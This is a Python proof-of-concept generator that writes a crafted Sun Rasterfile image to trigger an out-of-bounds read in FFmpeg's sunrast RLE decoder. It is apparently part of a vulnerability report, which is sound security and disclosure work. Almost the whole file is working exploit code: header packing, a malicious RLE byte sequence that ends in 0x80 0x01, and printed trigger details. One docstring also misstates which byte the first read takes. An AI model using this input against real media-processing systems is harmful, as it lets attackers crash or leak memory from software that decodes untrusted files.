#!/usr/bin/env python3
"""
PoC generator for VULN 001: Out-of-bounds Read in RT_BYTE_ENCODED RLE Decoder
Function: sunrast_decode_frame() in libavcodec/sunrast.c, lines 171-174

After the outer while loop guarantees buf < buf_end (1 byte available),
the decoder reads 1 byte as a potential RLE_TRIGGER (0x80). If it IS
RLE_TRIGGER, it unconditionally reads *buf++ for the run count (OOB if
buf==buf_end), and if run>1, reads *buf++ again for the pixel value
(second OOB read).

This PoC places 0x80, 0x01 as the last 2 bytes of the compressed data:
  - Read 0x80 -> RLE_TRIGGER, buf advances (1 byte left)
  - Read 0x01 -> run = 2, buf advances (buf == buf_end)
  - run != 1, so reads value = *buf++ -> OOB past end of packet
"""

import struct
import sys
import os

# Sun Rasterfile constants
RAS_MAGIC       = 0x59a66a95
RT_BYTE_ENCODED = 2
RMT_EQUAL_RGB   = 1
RLE_TRIGGER     = 0x80

def build_header(width, height, depth, data_length, img_type, maptype, maplength):
    """Pack a 32-byte Sun Rasterfile header (all big-endian)."""
    return struct.pack(">IIIIIIII",
        RAS_MAGIC,
        width,
        height,
        depth,
        data_length,   # length of compressed data (not used by FFmpeg decoder, but good practice)
        img_type,
        maptype,
        maplength,
    )

def build_rle_data_oob_second_read():
    """
    Craft RLE payload for a 4x4 depth=8 image (16 pixels total, no row padding
    since len=4 is already even -> alen=4).

    Encoding:
      - 14 literal 0x00 bytes   -> 14 pixels decoded
      - 0x80, 0x01              -> RLE_TRIGGER, decoder reads run=2
                                    buf is now at buf_end; reads value=*buf++ (OOB)
                                    writes 2 pixels with whatever is in padding
    Total: 16 bytes (14 + 2)

    OOB sequence (lines 171-174 in sunrast.c):
      value = *buf++        # reads 0x80 (last meaningful byte before the trigger pair)
      run   = *buf++ + 1    # reads 0x01 -> run=2; buf still has 0 bytes left
      value = *buf++        # READS PAST buf_end (second OOB, ~64 bytes into PADDING)
    """
    normal_pixels = bytes([0x00] * 14)
    rle_trigger_pair = bytes([RLE_TRIGGER, 0x01])   # 0x80 0x01 -> run=2
    return normal_pixels + rle_trigger_pair

def build_rle_data_oob_first_read():
    """
    Alternative: trigger only the first OOB (run count read) by placing
    0x80 as the very last byte.

    Encoding:
      - 15 literal 0x00 bytes   -> 15 pixels
      - 0x80                    -> last byte; after reading buf==buf_end
                                   run = *buf++ + 1 is OOB (reads first padding byte)
                                   first padding byte = 0x00 -> run=1 -> no second OOB
    Total: 16 bytes (15 + 1)
    """
    normal_pixels = bytes([0x00] * 15)
    trigger = bytes([RLE_TRIGGER])
    return normal_pixels + trigger

def main():
    out_path = os.path.join(os.path.dirname(__file__), "vuln_001_input.ras")

    width  = 4
    height = 4
    depth  = 8

    # For depth=8, len = (8*4+7)>>3 = 4 bytes/row; alen = 4 (no row padding needed)
    # Total pixels to write: 4 * 4 = 16

    # Use the variant that forces the second OOB (more impactful).
    rle_data = build_rle_data_oob_second_read()
    data_length = len(rle_data)   # 16

    # Colormap: 768 bytes (RMT_EQUAL_RGB with 256 entries, 3 bytes each R/G/B)
    # Content doesn't matter for the vulnerability; use zeros.
    maplength = 768
    colormap = bytes(maplength)

    header = build_header(
        width=width,
        height=height,
        depth=depth,
        data_length=data_length,
        img_type=RT_BYTE_ENCODED,
        maptype=RMT_EQUAL_RGB,
        maplength=maplength,
    )

    payload = header + colormap + rle_data

    with open(out_path, "wb") as f:
        f.write(payload)

    print(f"[+] Wrote {len(payload)} bytes to {out_path}")
    print(f"    Header:   32 bytes  (magic=0x{RAS_MAGIC:08x}, {width}x{height}, depth={depth}, type=RT_BYTE_ENCODED={RT_BYTE_ENCODED})")
    print(f"    Colormap: {maplength} bytes (RMT_EQUAL_RGB, 256 entries)")
    print(f"    RLE data: {data_length} bytes (14 x 0x00 + 0x80 0x01)")
    print()
    print("  OOB trigger sequence (sunrast.c lines 171-174):")
    print("    buf[0..13] = 0x00 (14 literal pixels) -> 14 pixels written, 2 bytes left")
    print("    buf[14]    = 0x80  -> matches RLE_TRIGGER; buf advances (1 byte left)")
    print("    buf[15]    = 0x01  -> run = 1+1 = 2; buf advances -> buf == buf_end")
    print("    *buf++ (line 174)  -> OOB READ (buf == buf_end, reads into padding)")

if __name__ == "__main__":
    main()
